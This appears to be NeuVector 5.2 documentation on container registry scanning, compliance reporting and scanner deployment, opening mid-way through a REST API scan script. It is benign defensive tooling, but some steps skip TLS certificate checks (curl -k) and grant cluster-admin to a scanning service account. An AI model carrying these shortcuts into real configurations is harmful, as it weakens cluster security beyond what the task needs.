&quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` scanning an image ... curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json while [ `wc -c &lt; scan_repository.json` = &quot;0&quot; ]; do echo `date +%Y%m%d_%H%M%S` scanning is still in progress ... sleep 5 curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json done echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 cat scan_repository.json | jq . rm *.json echo `date +%Y%m%d_%H%M%S` [$_curCase_] $_DESC_: $_RESULT_-$_ERRCODE_  ","version":"5.2","tagName":"h3"},{"title":"Registry Scanning Configuration","type":0,"sectionRef":"#","url":"/5.2/scanning/registry","content":"","keywords":"","version":"5.2"},{"title":"Configure Registry Scanning​","type":1,"pageTitle":"Registry Scanning Configuration","url":"/5.2/scanning/registry#configure-registry-scanning","content":" To configure registries and repositories to be scanning, go to the Assets -&gt; Registries menu in the NeuVector console. Add or edit registries to be scanned. Use the Filter to define repositories or subsets of images to be scanned. If your registry requires access through a proxy, this can be configured in Settings -&gt; Configuration.    The registry will be scanned according to a schedule, which is configurable. By default, only new or updated images will be scanned. If you want to re-scan all applicable images whenever the CVE database is updated, select the Rescan After CVE DB Update button when configuring the registry. You can also select Layered Scan to show vulnerabilities by each layer in the image (note: layered scans can take longer and consume more resources to complete).  After the scan is completed you will see the results below it. Click on the repository/tag to see vulnerabilities and click on the vulnerability to see more info. You can also download the report in a CSV file or see the results in the Event logs.    The scan results include vulnerabilities by image layer, if this option was selected during registry/repository configuration, as well the compliance checks results. Click the compliance tab when viewing the scan results for the image to see compliance checks.  Scanning will also discover and list all Modules (ie, an inventory) in the image, as shown below. It will also summarize the vulnerability risk by module and list all vulnerabilities for each module.    Scanning is supported for images on public and private docker registries that are based on Native Docker, Amazon ECR, Redhat/Openshift, jFrog, Microsoft ACR, Sonatype Nexus, Harbor, Google cloud and other registries. The scan report for the image comprises of the vulnerability status of various packages and binaries in the image. The brief summary of the scan report can be sent via webhook using the Response rule configuration in Policy -&gt; Response Rules, or by Syslog by configuring a syslog server in Settings -&gt; Configuration. Results can also be viewed in the Event logs.  At least one repository filter is required (can't be left blank).  Repository filter examples​    Notes:  To scan all image tags, add filter as * or *:*. This works on all registry types except the public docker registry.Repository should be full name if organization is nil for public docker registry or add library before repository as given above.Create a virtual repository and add all local repository to it to scan all tags on a JFrog registry with the subdomain docker access method.Regular expressions can be used in a filter. For example alpine:3.[8|9].* will scan all 3.8.x and 3.9.x images and tags on docker hub.  Registry scan options​  Scan Layers: Provides vulnerability scan result for every image layer separatelyProvides information about commands executed, packages added in the layerImages size of each layer Auto Scan: Auto Scan is only supported with OpenShift imagestream integration. Proper role binding should be configured in advance.When Auto Scan is enabled, as soon as an image is pushed to the registry, the image scan will be scheduled. Periodical Scan: Enable periodic scan to scan periodicallyScan interval can set to be between 5 minutes to every 7 days.Because many Admission Control checks rely on image scan result, enabling periodical scan helps make sure Admission Control has the up-to-date information of the images. Rescan after CVE DB update Enable this option to rescan all images after the vulnerability database is updated.  Configuring Proxy server for Registry​  Please go to Settings -&gt; Configuration to configure proxy settings for registry scanning.  Native Docker registry (also Quay and Harbor)​  Add Native Docker registry​  Choose Docker registry as typeGive unique name to the registryType registry URL with portProvide username and password if required by the registryAdd repository as filter in the below format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2*  Adding private docker registry with username/password, scan layers enabled, periodic scan for every 30 minutes enabled and * as filter to scan all tags from all repository.  Adding public docker registry for scanning without username/password and 2 repositories with wildcard, scan layers enabled and periodic scan enabled.  Adding public docker registry for scanning with username/password, wildcard repository, scan layers enabled, and periodic scan enabled.  Note for Quay:  Enter the top-level URL for your Quay registry; do not enter any directories to the path.You will need to generate an encrypted password in your Quay server/account, and use these credentials here. Then, pass filter(s) as described above.    Start scanning the Docker registry​  Select registry to be scannedClick start button to scanWait till status changes from scanning to idle Scanning time varies depending on the size of the repository    View the scan result​  Click on an image from images pane to view the scan result for the image.Access the scan result to find the vulnerability status of the image.Click download button to download scan result of the image if neededMove mouse in between CVE detail and images to get back to summary  Showing images scanned for the selected registry    Example showing layer scan result of an image, which shows vulnerabilities of each layer, layer size and commands run on each layer. In addition, there is a Compliance tab which shows the compliance test results for the image.    Amazon ECR Registry​  Ref: https://docs.aws.amazon.com/AmazonECR/latest/userguide/Registries.html  Add Amazon ECR registry​  Choose Amazon registry as typeGive unique name to the registryRegistry URL is automatically found with other informationSupply below information for the registry. Refer above amazon link to get below information Registry idRegionAccess key idSecret access key Add repository as filter in the following format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2*Organization can be empty if such image available in the registry* to scan all image tags    Redhat registry​  Ref: https://access.redhat.com/containers  Add Red Hat registry​  Choose Redhat registry as typeGive unique name to the registryType registry URL https://registry.connect.redhat.com/Provide username and password of the account used for managing registryAdd repository as filter in the below format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2** to scan all image tags    Openshift registry​  Add OpenShift registry with username and password​  Choose OpenShift registry as typeGive unique name to the registryType registry URL (obtain from the output of &quot;oc get is&quot; command in OpenShift network if it is different than default) Default registry URL https://docker-registry.default.svc:5000/ Provide username and password of the account used for managing registryAdd repository as filter in the below format Organization/repository:tagExample openshift/htt*:** to scan all image tags Enable auto scan to start the scan as soon as image is updated on OpenShift image stream.  Add OpenShift registry with token​  Choose OpenShift registry as typeGive unique name to the registryType registry URL (obtain from the output of &quot;oc get is&quot; command in OpenShift network if it is different than default) Default registry URL https://docker-registry.default.svc:5000/ Provide token of the service account which has access to all namespaces Check below note to create service account and get token.Create service account oc project defaultoc create sa nvqaoc get sa Assign cluster admin role to service account to read all registry oc adm policy add-cluster-role-to-user cluster-admin system:serviceaccount:default:nvqa Get token for the service account oc sa get-token nvqa Add repository as filter in the below format Organization/repository:tagExample openshift/htt*:** to scan all image tags Enable auto scan to start the scan as soon image is updated on OpenShift image stream.    Stability issues in Openshift 3.7 Registry​  In OpenShift 3.7, API calls to pull container image metadata or to download an image can fail randomly. It can also fail on random images in different scan runs. You may see incomplete image lists or scans may fail on some images when this happens. If this occurs, the repository can be rescanned.  JFrog Artifactory​  Adding JFrog Artifactory registry (Docker Access method – Repository Path) JFrog management page admin-&gt;HTTP Setting showing docker access method - Repository Path    Add JFrog Artifactory registry (Docker Access method – Repository Path)​  Choose JFrog Artifactory as typeGive a unique name to the registry Type the registry URL with port, for example http://10.1.7.122:8081/ Provide a username and password if required by the registryAdd the repository as a filter in the below format Organization/repository:tagRepository or tag can have wildcards at end, such as abc/*, abc/n*To scan all tags for a repository, for example alpine, use alpine:*The wildcard must be preceded by the full name, path, or starting string* to scan all tags  Adding JFrog Artifactory registry (Docker Access method – subdomain)​  JFrog management page admin-&gt;HTTP Setting showing docker access method – Sub Domain    Add JFrog Artifactory registry (Docker Access method – subdomain)  Choose JFrog Artifactory as typeGive a unique name to the registryType the registry URL with port, for example http://10.1.7.122:8081/Choose Subdomain as JFrog Docker Access MethodProvide a username and password if required by the registryAdd the repository as a filter in the below format Subdomain/repository:tagRepository or tag can have wildcards at end, such as abc/*, abc/n*To scan all tags for a repository, for example alpine, use alpine:*The wildcard must be preceded by the full name, path, or starting string* for scanning all tags from all subdomains  note Create a virtual repository and add all local and remote repository to it. Specify this virtual repository in the filter section to scan all tags from local and remote remote repository.  Adding subdomain based JFrog registry to scan images from docker-local subdomain    Adding subdomain based JFrog registry to scan all tags from all subdomains    Add JFrog Artifactory registry (Docker Access method – port)​  JFrog management page admin-&gt;HTTP Setting showing docker access method - Port    JFrog management page admin-&gt;Local Repository-&gt;docker-local repository-&gt; Advanced - showing repository URL and registry port 8181    JFrog management page admin-&gt;Local Repository-&gt;guo repository-&gt; Advanced - showing repository URL and registry port 8182    Choose JFrog Artifactory as typeGive a unique name to the registryType the registry URL with port, for example http://10.1.7.122:8181/ Every Registry name has unique port Choose Port as JFrog Docker Access MethodProvide a username and password if required by the registryAdd the repository as a filter in the below format Organization/repository:tagRepository or tag can have wildcards at end, such as abc/, abc/nTo scan all tags for a repository, for example alpine, use alpine:*The wildcard must be preceded by the full name, path, or starting string* for scanning all tags  Adding JFrog registry for port access method for registry docker-local with port 8181    Adding JFrog registry for port access method for registry with port 8182    Adding JFrog registry for port access method for the virtual registry with port 8188, which has all local registries added to it.    Showing scanned result for docker-local registry    Add SaaS JFrog Artifactory registry (Docker access method – Port)​  Choose JFrog Artifactory as type  Give a unique name to the registryType the registry URL, for example https://jfrogtraining-docker-nv-virtual.jfrog.ioChoose Port as JFrog Docker Access MethodProvide a username and password if required by the registryAdd the repository as a filter in the below format Organization/repository:tag* to scan all tags of all repository    Start Scanning a JFrog Artifactory Registry​  Select registry to be scannedClick start button to scanWait until status changes from scanning to idle Scanning time varies depending on the size of the repository  Google Container Registry​  Ref:https://cloud.google.com/container-registry/docs/advanced-authenticationhttps://cloud.google.com/container-registry/docs/advanced-authentication#json_key_file  Enable Cloud Resource Manager API for the project​  Google Cloud Platform-&gt;Choose Project-&gt;API and Services-&gt;Enable APIS and Services-&gt;Search “Cloud Resource Manager API”-&gt;Enable APIhttps://console.cloud.google.com/apis/library?project=nvtest-219600&amp;q=Cloud%20Resource%20Manager%20API (change project name)  Create key for container service account​  Google Cloud Platform--&gt;IAM--&gt;Service Account--&gt;account with container registry--&gt;CreateKey(action)--&gt;  Copy json file to client machine​  Add Google Container Registry from the NeuVector GUI​  Choose Google registry as typeGive unique name to the registryType registry URL. Sample https://gcr.io/ (this could also be us.gcr.io, eu.gcr.io etc)Paste all content above captured json file into JSON key.Add repository as filter in the below format Project-id/repository:tagExample nvtestid-1/neuvector*:** to scan all image tags  Start Scanning a Google Container Registry​  Select registry to be scannedClick start button to scanWait until status changes from scanning to idle Scanning time varies depending on the size of the repository  Azure Container Registry​  Ref:https://azure.microsoft.com/en-us/services/container-registry/  Obtain Azure container username and password as shown below​  Azure container registry -&gt; user-&gt; access keys-&gt;password  Showing azure portal username and password for container registry access    Add Azure Container Registry from the NeuVector GUI​  Choose Azure registry as typeGive unique name to the registryType registry URL. Sample https://neuvector.azure.io (obtain from azure portal) Container registry-&gt;user-&gt;Overview-&gt;Login Server Add username and password Azure container registry -&gt; user-&gt; access keys-&gt;password Add repository as filter in the below format repository:tagexample alpine:** to scan all image tags  Showing azure portal login server for Azure container registry    Adding Azure container registry to scan all tags    Start Scanning a Azure Container Registry​  Select registry to be scannedClick start button to scanWait until status changes from scanning to idle Scanning time varies depending on the size of the repository  Sonatype Nexus Docker registry​  Ref:https://help.sonatype.com/repomanager3/private-registry-for-dockerhttps://hub.docker.com/r/sonatype/nexus3/  Add Sonatype Nexus Docker registry​  Choose Sonatype Nexus as typeGive unique name to the registryType registry URL with portProvide username and password if required by the registryAdd repository as filter in the below format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2** to scan all image tags  Adding Sonatype Nexus docker registry with username/password and repository *:* for scanning    Start scanning Sonatype Nexus Docker registry​  Select registry to be scannedClick start button to scanWait till status changes from scanning to idle Scanning time varies depending on the size of the repository  Gitlab Container Registry​  Sample GitLab Environmnent Configurations​  sudo docker run --detach \\ --hostname gitlab \\ --env GITLAB_OMNIBUS_CONFIG=&quot;external_url 'http://10.1.7.73:9096'; gitlab_rails['lfs_enabled'] = true;&quot; \\ --publish 10.1.7.73:9095:9095 --publish 10.1.7.73:9096:9096 --publish 10.1.7.73:6222:22 \\ --name gitlab \\ --restart always \\ --volume /srv/gitlab/config:/etc/gitlab \\ --volume /srv/gitlab/logs:/var/log/gitlab \\ --volume /srv/gitlab/data:/var/opt/gitlab \\ gitlab/gitlab-ce:latest External_URL: http://10.1.7.73:9096 Registry_URL: https://10.1.7.73:9095   Obtain Gitlab private token as shown below​  Navigate to the settings page from the icon located at the upper-righthand corner of the GitLab login page as illustrated below:    Navigate to the Access_Tokens page as shown below from the User_Settings page:    Fill in all applicable fields, and click “Create personal access token” when ready to generate the access token:    Access token will no longer be available once the user has navigated away from the generated token page. Therefore, it is highly recommended to make a copy of the access token prior to navigating or closing the following page:    Obtaining External and Registry URLs​  External-URL: The external url is the API-Server's URL. Registry-URL: This can be obtained from the Container Registry page of the GitLab webconsole. One way to get to this page is navigating from the GitLab’s webconsole from Projects &gt; Your Projects &gt; Administrator / … &gt; Left-Pane (Container Registry) &gt; Mouse-over (root/.../)  The following is a sample screen-capture of the page that reveals both the External-URL and the Registry-URL:    Add Gitlab Registry from the NeuVector Console​  Choose Gitlab as the registry typeGive unique name to the registryType registry URL with portProvide username and password if required by the registryProvide Gitlab external URL and the private token obtained from the last section    note The Registry URL is used for pulling images into the NeuVector scanner-platform from GitLab to do registry scanning. While the External URL is used for retrieving a list of images, registries, and metadata used by the registry scanning feature.  IBM Cloud Container Registry​  Ref: https://www.ibm.com/cloud/container-registry  Add IBM Container registry​  Choose IBM Cloud Container Registry as typeGive unique name to the registryType registry URL https://us.icr.io/Provide iamapikey as username and the apikey below as password Create apikey from CLI ibmcloud iam api-key-create atibmKey Create apikey from GUI IBM Cloud-&gt;Manage-Access(IAM)-IBM Cloud API Keys Provide IBM Cloud Account Obtain IBM cloud account from CLI Ibmcloud cr info Add repository as filter in the below format Organization/repository:tagRepository can have wildcard with starting stringExample neuvector/all*:2* to scan all image tags Enable other parameters if needed    note The username for the registry authentication must be 'iamapikey'  Harbor Registry​  Use the same instructions as for the Native Docker registry, choosing Docker as the registry.  The filter field can not be left blank. Enter a repository filter, or add filter as * to scan all repositories. ","version":"5.2","tagName":"h3"},{"title":"Scanning & Compliance","type":0,"sectionRef":"#","url":"/5.2/scanning/scanning","content":"","keywords":"","version":"5.2"},{"title":"Overview of NeuVector Scanning​","type":1,"pageTitle":"Scanning & Compliance","url":"/5.2/scanning/scanning#overview-of-neuvector-scanning","content":" Scanning is performed at all phases of the pipeline from Build to Registry to Run-Time, on various assets, as shown below.  Scan Type\tImage\tNode\tContainer\tOrchestratorVulnerabilities\tYes\tYes\tYes\tYes CIS Benchmarks\tYes\tYes\tYes\tYes Custom Compliance\tNo\tYes\tYes\tNo Secrets\tYes\tYes\tYes\tNo Modules\tYes\tN/A\tN/A\tN/A  Images are scanned either in Registry scanning or through Build-phase plug-ins such as Jenkins, CircleCI, Gitlab etc.  The CIS Benchmarks support by NeuVector include:  KubernetesDockerRed Hat OpenShift draft 'Inspired by CIS' benchmarksGoogle GKE  The open source implementation of these benchmarks can be found on the NeuVector Github page.  note Secrets can also be detected on Nodes and in Containers with Custom Scripts.  Kubernetes Resource Deployment File Scanning​  NeuVector is able to scan deployment yaml files for configuration assessments against Admission Control rules. This is useful to scan deployment yaml files early in the pipeline to determine if the deployment would violate any rules before attempting the deployment. Please see Configuration Assessment under Admission Controls for more details.  ","version":"5.2","tagName":"h3"},{"title":"Managing Vulnerabilities and Compliance​","type":1,"pageTitle":"Scanning & Compliance","url":"/5.2/scanning/scanning#managing-vulnerabilities-and-compliance","content":" NeuVector provides several ways to review vulnerability and compliance scan results and generate reports. These include:  Dashboard. Review summary vulnerabilities and see how they impact the overall Security Risk Score.Security Risks Menu. View the impact of vulnerabilities and compliance issues and generate reports with advanced filtering.Assets Menu. See vulnerability and compliance results for each asset such as registries, nodes, and containers.Notifications -&gt; Risk Reports. View scan events for each asset.Response Rules. Create responses such as web hook notifications or quarantines based on scan results.REST API. Trigger scans and pull scan results programmatically to automate the process.SYSLOG/Webhook Alerts. Send scan results to a SIEM or other enterprise platforms.  Security Risks Menu​  These menu's combine the results from registry (image), node, and container vulnerability scans and compliance checks found in the Assets menu to enable end-to-end vulnerability management and reporting. The Compliance profile menu enables customization of the PCI, GDPR and other compliance checks for generating compliance reports.    See the next section on Vulnerability Management for how to manage vulnerabilities in this menu, and the Compliance &amp; CIS Benchmarks section for reporting on CIS Benchmarks and industry compliance such as PCI, GDPR, HIPAA, and NIST.  Assets Menu​  The Assets menu reports vulnerabilities and compliance checks results organized by the asset.  Platforms. The orchestration platform such as Kubernetes, and vulnerability scans of the platform.Nodes. Nodes/hosts protected by NeuVector Enforcers, and results of Compliance checks such as CIS benchmarks and custom checks, as well as host vulnerability scans.Containers. All containers in the cluster including system containers, and the results of Compliance checks such as CIS benchmarks and custom checks, as well as container run-time Vulnerability scans. Process activity and performance statistics can also be found here.Registries. Registries/repositories scanned by NeuVector. Layered image scanning results are found here, and scan results can be used in Admission control rules (found in Policy -&gt; Admission Controls).  note Custom compliance checks as mentioned above are defined in the Policy -&gt; Groups menu.  Automated Run-Time Scanning​  NeuVector can scan running containers, host nodes, and the orchestration platform for vulnerabilities. In the Assets menu for Nodes or Containers, enable Auto-Scan by clicking on the Vulnerabilities tab for a node or container, then Auto-Scan (appears in upper right) to scan all running containers, nodes, and platform including newly started ones once they start running. You can also select a container or node and scan it manually.  You can click on each vulnerability name/CVE that is discovered to retrieve a description of it, and click on the inspect arrow in the popup to see the detailed description of the vulnerability.    The auto-scan will also be triggered when ever there is an update to the NeuVector CVE database. Please see the section Updating the CVE Database for details.  ","version":"5.2","tagName":"h3"},{"title":"Automated Actions, Mitigations, and Responses Based on Vulnerabilities​","type":1,"pageTitle":"Scanning & Compliance","url":"/5.2/scanning/scanning#automated-actions-mitigations-and-responses-based-on-vulnerabilities","content":" Admission control rules can be created to prevent deployment of vulnerable images based on Registry scanning results. See the Security Policy -&gt; Admission Control section for details.  Please see the section Security Policy -&gt; Response Rules for instructions for creating automated responses to vulnerabilities detected either during registry scanning, run-time scanning, or CIS benchmarks. Responses can include quarantine, webhook notification, and suppression.  Federated Registries for Distributed Image Scanning Results​  The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage. See the multi-cluster section for more details.  Auto-scaling of Scanner Pods​  Scanner pods can be configured to auto-scale based on certain criteria. This will ensure that scanning jobs are handled quickly and efficiently, especially if there are thousands of images to be scanned or re-scanned. There are three possible settings: delayed, immediate, and disabled. When images are queued for scanning by the controller, it keeps a 'task count' of the queue size. Please see the multiple scanners section for more details.  important Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value. ","version":"5.2","tagName":"h3"},{"title":"Harbor Pluggable Scanner Module","type":0,"sectionRef":"#","url":"/5.2/scanning/registry/harbor","content":"","keywords":"","version":"5.2"},{"title":"Scanning Harbor Registries Using the Pluggable Scanner​","type":1,"pageTitle":"Harbor Pluggable Scanner Module","url":"/5.2/scanning/registry/harbor#scanning-harbor-registries-using-the-pluggable-scanner","content":" NeuVector supports invoking the NeuVector scanner from Harbor registries through the pluggable scanner interface. This requires configuration of the connection to the controller (exposed API). The Harbor adapter calls controller endpoint to trigger a scan, which can scan automatically on push. Interrogation services can be used for periodic scans. Scan results from Federation Primary controllers ARE propagated to remote clusters.  note There is an issue with the HTTPS based adapter endpoint error: please ignore Test Connection error, it does work even though an error is shown (skip certificate validation).  Deploying the NeuVector Registry Adapter​  The 5.2 Helm chart contains options to deploy the registry adapter for Harbor. It can also be pulled manually from the neuvector/registry-adapter repo on Docker Hub. Options also include setting the Harbor registry request protocol and the basic authentication secret name.  After deployment of the adapter, it is necessary to configure this in Harbor.    The adapter endpoint must be entered, and the adapter connects to the controller, which is typically exposed as a service externally so the adapter can connect to it. In addition, authentication credentials for a valid NeuVector user must be entered.  Scanning Images from a Harbor Registry​  After successful deployment and connection to a controller, an image scan can be manually or automatically triggered from Harbor.    Periodic scans (scheduled) can be configured through Interrogation Services in Harbor, to make sure the latest CVE database is used to rescan images in registries.    Scan results can be viewed directly in Harbor.    Sample Deployment Yaml​  Below is an example yaml:  apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 1 selector: matchLabels: app: neuvector-scanner-pod template: metadata: labels: app: neuvector-scanner-pod spec: imagePullSecrets: - name: regsecret containers: - name: neuvector-scanner-pod image: neuvector/scanner:latest imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector restartPolicy: Always hostAliases: - ip: &quot;10.1.5.106&quot; hostnames: - &quot;harbor270.com&quot; --- apiVersion: v1 kind: Service metadata: name: neuvector-service-registry-adapter namespace: neuvector spec: ports: - port: 9443 #https #- port: 8090 #http nodePort: 32000 name: registry-adapter protocol: TCP type: LoadBalancer selector: app: neuvector-registry-adapter-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-registry-adapter-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-registry-adapter-pod replicas: 1 template: metadata: labels: app: neuvector-registry-adapter-pod spec: serviceAccount: basic serviceAccountName: basic imagePullSecrets: - name: regsecret containers: - name: neuvector-registry-adapter-pod image: neuvector/registry-adapter:latest imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: HARBOR_SERVER_PROTO value: https #Need to mod. http/https - name: HARBOR_BASIC_AUTH_USERNAME valueFrom: secretKeyRef: name: neuvector-registry-adapter key: username - name: HARBOR_BASIC_AUTH_PASSWORD valueFrom: secretKeyRef: name: neuvector-registry-adapter key: password restartPolicy: Always   For OpenShift 4.6+, also add the route:  apiVersion: route.openshift.io/v1 kind: Route metadata: name: neuvector-route-registry-adapter namespace: neuvector spec: to: kind: Service name: neuvector-service-registry-adapter port: targetPort: registry-adapter tls: termination: passthrough  ","version":"5.2","tagName":"h3"},{"title":"Compliance & CIS Benchmarks","type":0,"sectionRef":"#","url":"/5.2/scanning/scanning/compliance","content":"","keywords":"","version":"5.2"},{"title":"Managing Compliance and CIS Benchmarks​","type":1,"pageTitle":"Compliance & CIS Benchmarks","url":"/5.2/scanning/scanning/compliance#managing-compliance-and-cis-benchmarks","content":" Compliance auditing with NeuVector includes CIS Benchmarks, custom checks, secrets auditing, and industry standard templates for PCI, GDPR and other regulations.  CIS Benchmarks automatically run by NeuVector include:  KubernetesDockerRed Hat OpenShift draft 'Inspired by CIS' benchmarksGoogle GKE  Compliance scan results can be seen for individual Assets in the Registries (for Images), Nodes, and Containers menus by selecting the relevant asset and clicking the Compliance tab.  The Security Risks -&gt; Compliance menu enables consolidated compliance reporting, similar to how the Vulnerabilities menu works.  Security Risks - Compliance and Compliance Profile​  Compliance results are show in the list by Category and Name. Categories include Docker, Kubernetes, OpenShift, and Custom. The names of each item correspond to the CIS benchmark. For example, K.4.2.3 corresponds to the Kubernetes CIS benchmark 4.2.3. Docker benchmarks are preceded with 'D' with the exception of Image related benchmarks, which are preceded by 'I'.  Use the Advanced filter to select compliance checks based on platform, host, namespace or industry standard, as shown below.    After applying the filter, only the relevant CIS benchmarks and custom checks will be shown, and a report can be generated and downloaded. This is how reports for standards such as PCI, HIPAA, GDPR and other standards can be generated.  The following screenshot shows an example of a secret found in an image scan.    Customizing Compliance Templates for PCI, GDPR, HIPAA, NIST and others​  The Compliance profile menu enables customization of the built-in templates for industry standards such as PCI and GDPR. These reports can be generated from the Security Risks -&gt; Compliance menu by selecting one of the standards to filter, then exporting. The NIST profile is for NIST SP 800-190.  To customize any compliance profile, select the industry standard (e.g. PCI), then enable or disable specific checks for that standard. Think of these as compliance 'tags' that are applied to each check in order to generate a compliance report for that industry standard.  Use the Action button to add or remove any compliance tag from that check.    In addition, you can select which 'Assets' are considered to be part of the compliance reports by clicking on the Assets tab. By default, all compliance templates are applied to Images, Nodes and Containers.    Use the Action button to add or remove compliance templates for assets.  Images. Select the standard(s) to be reported for Images.Nodes. Select the standard(s) to be reported for Nodes (hosts).Containers. Select the stadard(s) to be reported for Containers.  Alternatively, instead of restricting by the above criteria, compliance templates can be restricted to certain Namespaces. If this box is checked and namespace(s) added, reports will be generated for all assets which apply to these namespaces. This can be useful if, for example, the PCI template should only report on assets for namespaces which container PCI in-scope (applicable) workloads.    After the templates and assets are customized (if desired) in the Security Risks -&gt; Compliance Profiles menu, reports can be generated in the Security Risks -&gt; Compliance menu by opening the advanced filter and selecting the compliance template desired. For example, selecting GDPR will filter the display and reports for only the GDPR profile.  Secrets Auditing​  NeuVector checks for over 40 common types of secrets as part of the image compliance scans and run-time scans. In addition, custom compliance scripts can be configured for containers or hosts, and the DLP packet inspection feature can be used to check for secrets in network payloads.  The results for secrets auditing can be found in the Compliance section of image scans (Assets -&gt; Registries), containers (Assets -&gt; Containers), nodes (Assets -&gt; Nodes), and the compliance management menu (Security Risks -&gt; Compliance).  The following is an example of how secrets detected in an image scan will be displayed.    Here is a list of the types of secrets being detected.  General Private KeysGeneral detection of credentials including 'apikey', 'api_key', 'password', 'secret', 'passwd' etc.General passwords in yaml files including 'password', 'passwd', 'api_token' etc.General secrets keys in key/value pairsPutty Private keyXML Private keyAWS credentials / IAMFacebook client secretFacebook endpoint secretFacebook app secretTwitter client IdTwitter secret keyGithub secretSquare product IdStripe access keySlack API tokenSlack web hooksLinkedIn client IdLinkedIn secret keyGoogle API keySendGrid API keyTwilio API keyHeroku API keyMailChimp API keyMailGun API key ","version":"5.2","tagName":"h3"},{"title":"Parallel & Standalone Scanners","type":0,"sectionRef":"#","url":"/5.2/scanning/scanners","content":"","keywords":"","version":"5.2"},{"title":"Increase Scanner Scalability with Multiple Scanners​","type":1,"pageTitle":"Parallel & Standalone Scanners","url":"/5.2/scanning/scanners#increase-scanner-scalability-with-multiple-scanners","content":" To increase scanner performance and scalability, NeuVector supports deploying multiple scanner pods which can, in parallel, scan images in registries. The controller assigns scanning tasks to each available scanner pod. Scanner pods can be scaled up or down easily as needed using Kubernetes.  Scanner pods should be deployed to separate nodes to spread the workload across different host resources. Remember that a scanner requires enough memory to pull and expand the image, so it should have available to it more than the largest image size to be scanned. If necessary, scanners can be placed on specific nodes or avoid placing multiple pods on one node using standard Kubernetes node labels, taints/tolerations, or node affinity configurations.  By default, NeuVector deploys 2 scanner pods, as part of the sample deployments in the section Deploying NeuVector. These replicasets can be scaled up or down as needed.  The scanner container the latest CVE database and is regularly updated (with 'latest' tag) by NeuVector. The updater redeploys the scanner, forcing a pull of the latest scanner image in order to get the latest CVE database. See the section Updating the CVE Database for more details on the updater.  Please note that in initial releases the presence and status of multiple scanners is only visible in Kubernetes with 'kubectl get pods -n neuvector' and will not be displayed in the web console.  Scan results from all scanners are shown in the Assets -&gt; Registries menu. Additional scanner monitoring features will be added in future releases.  Auto-scaling of Scanner Pods​  Scanner pods can be configured to auto-scale based on certain criteria. This will ensure that scanning jobs are handled quickly and efficiently, especially if there are thousands of images to be scanned or re-scanned. There are three possible settings: delayed, immediate, and disabled. When images are queued for scanning by the controller, it keeps a 'task count' of the queue size.  Delayed strategy: When lead controller continuously sees &quot;task count&quot; &gt; 0 for &gt; 90 seconds, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Immediate strategy: Every time when lead controller sees &quot;task count&quot; &gt; 0, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet  Scanner auto-scaling is configured in Settings -&gt; Configuration. The minimumScannerPods setting sets the minimum scanner pods running at any time, while the maxScannerPods sets the maximum number of pods that the auto-scaling strategy can scale up to. NOTE: Setting a minimum value will not adjust the original scanner deployment replicaset value. The minimum value will be applied during the first scale up/down event.  important Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value.  Operations and Debugging​  Each scanner pod will query the registries to be scanned to pull down the complete list of available images and other data. Each scanner will then be assigned an image to pull and scan from the registry.  To inspect the scanner behavior, logs from each scanner pod can be examined using  kubectl logs &lt;scanner-pod-name&gt; -n neuvector   ","version":"5.2","tagName":"h3"},{"title":"Performance Planning​","type":1,"pageTitle":"Parallel & Standalone Scanners","url":"/5.2/scanning/scanners#performance-planning","content":" Experiment with varying numbers of scanners on registries with a large number of images to observe the scan completion time behavior in your environment. 2-5 scanners as the replica setting should be sufficient for most cases.  When a scan task is assigned to a scanner, it pulls the image from the registry (after querying the registry for the list of available images). The amount of time it takes to pull the image (download) typically consumes the most time. Multiple scanners can be pulling images from the same registry in parallel, so the performance may be limited by registry or network 